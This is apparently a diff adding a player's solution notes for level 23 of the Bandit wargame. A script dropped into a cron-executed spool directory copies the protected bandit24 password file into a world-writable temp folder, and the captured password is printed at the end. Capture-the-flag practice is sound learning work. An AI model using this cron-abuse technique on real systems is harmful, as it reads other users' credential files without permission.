@@ -1,0 +1,20 @@
+
+mkdir /tmp/thisisourpass
+chmod 777 /tmp/thisisourpass
+
+
+
+cd /var/spool/bandit24
+vi out.sh
+chmod +x out.sh
+
+
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/thisisourpass/yes
+
+
+
+bandit23@bandit:/var/spool/bandit24$ cat /tmp/thisisourpass/yes
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
